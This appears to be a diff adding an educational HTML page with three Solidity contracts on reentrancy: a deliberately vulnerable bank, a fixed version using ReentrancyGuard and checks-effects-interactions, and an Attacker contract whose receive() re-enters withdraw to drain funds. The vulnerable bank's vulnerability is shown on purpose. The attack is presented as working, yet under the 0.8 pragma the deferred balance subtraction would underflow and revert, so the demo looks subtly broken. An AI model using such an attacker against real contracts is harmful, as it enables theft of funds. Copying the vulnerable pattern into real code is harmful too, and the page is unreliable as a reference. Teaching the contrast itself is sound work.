@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Code Sample - Solidity</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="container">
+  <div class="post">
+    <h2>Vulnerable Contract Example</h2>
+    
+    <!-- Code Box with Header and Line Numbers -->
+    <div class="codebox with-lines">
+      <div class="code-header">
+        <span class="code-filename">VulnerableBank.sol</span>
+        <span class="code-copy">Copy</span>
+      </div>
+      <div class="code-content">
+        <pre><code class="language-solidity"><span class="line">// SPDX-License-Identifier: MIT</span>
+<span class="line">pragma solidity ^0.8.0;</span>
+<span class="line"></span>
+<span class="line">contract VulnerableBank {</span>
+<span class="line">    mapping(address => uint256) public balances;</span>
+<span class="line"></span>
+<span class="line">    function deposit() public payable {</span>
+<span class="line">        balances[msg.sender] += msg.value;</span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    // ⚠️ VULNERABLE: State updated after external call</span>
+<span class="line">    function withdraw(uint256 amount) public {</span>
+<span class="line">        require(balances[msg.sender] >= amount, "Insufficient balance");</span>
+<span class="line"></span>
+<span class="line">        // External call before state update</span>
+<span class="line">        (bool success, ) = msg.sender.call{value: amount}("");</span>
+<span class="line">        require(success, "Transfer failed");</span>
+<span class="line"></span>
+<span class="line">        // State updated after external call - VULNERABLE!</span>
+<span class="line">        balances[msg.sender] -= amount;</span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    function getBalance() public view returns (uint256) {</span>
+<span class="line">        return balances[msg.sender];</span>
+<span class="line">    }</span>
+<span class="line">}</span></code></pre>
+      </div>
+    </div>
+
+    <h2>Secure Contract Example</h2>
+    
+    <div class="codebox with-lines">
+      <div class="code-header">
+        <span class="code-filename">SecureBank.sol</span>
+        <span class="code-copy">Copy</span>
+      </div>
+      <div class="code-content">
+        <pre><code class="language-solidity"><span class="line">// SPDX-License-Identifier: MIT</span>
+<span class="line">pragma solidity ^0.8.0;</span>
+<span class="line"></span>
+<span class="line">import "@openzeppelin/contracts/security/ReentrancyGuard.sol";</span>
+<span class="line"></span>
+<span class="line">contract SecureBank is ReentrancyGuard {</span>
+<span class="line">    mapping(address => uint256) public balances;</span>
+<span class="line"></span>
+<span class="line">    function deposit() public payable {</span>
+<span class="line">        balances[msg.sender] += msg.value;</span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    // ✅ SECURE: Uses ReentrancyGuard and CEI pattern</span>
+<span class="line">    function withdraw(uint256 amount) public nonReentrant {</span>
+<span class="line">        // Checks</span>
+<span class="line">        require(balances[msg.sender] >= amount, "Insufficient balance");</span>
+<span class="line"></span>
+<span class="line">        // Effects - Update state BEFORE external call</span>
+<span class="line">        balances[msg.sender] -= amount;</span>
+<span class="line"></span>
+<span class="line">        // Interactions - External call happens last</span>
+<span class="line">        (bool success, ) = msg.sender.call{value: amount}("");</span>
+<span class="line">        require(success, "Transfer failed");</span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    function getBalance() public view returns (uint256) {</span>
+<span class="line">        return balances[msg.sender];</span>
+<span class="line">    }</span>
+<span class="line">}</span></code></pre>
+      </div>
+    </div>
+
+    <h2>Attack Contract Example</h2>
+    
+    <div class="codebox with-lines">
+      <div class="code-header">
+        <span class="code-filename">Attacker.sol</span>
+        <span class="code-copy">Copy</span>
+      </div>
+      <div class="code-content">
+        <pre><code class="language-solidity"><span class="line">// SPDX-License-Identifier: MIT</span>
+<span class="line">pragma solidity ^0.8.0;</span>
+<span class="line"></span>
+<span class="line">interface IVulnerableBank {</span>
+<span class="line">    function deposit() external payable;</span>
+<span class="line">    function withdraw(uint256 amount) external;</span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line">contract Attacker {</span>
+<span class="line">    IVulnerableBank public vulnerableBank;</span>
+<span class="line">    uint256 public constant AMOUNT = 1 ether;</span>
+<span class="line"></span>
+<span class="line">    constructor(address _vulnerableBank) {</span>
+<span class="line">        vulnerableBank = IVulnerableBank(_vulnerableBank);</span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    function attack() external payable {</span>
+<span class="line">        require(msg.value >= AMOUNT, "Need at least 1 ETH");</span>
+<span class="line">        vulnerableBank.deposit{value: AMOUNT}();</span>
+<span class="line">        vulnerableBank.withdraw(AMOUNT);</span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    // Fallback function - triggers reentrancy</span>
+<span class="line">    receive() external payable {</span>
+<span class="line">        if (address(vulnerableBank).balance >= AMOUNT) {</span>
+<span class="line">            vulnerableBank.withdraw(AMOUNT);</span>
+<span class="line">        }</span>
+<span class="line">    }</span>
+<span class="line">}</span></code></pre>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+</body>
+</html>
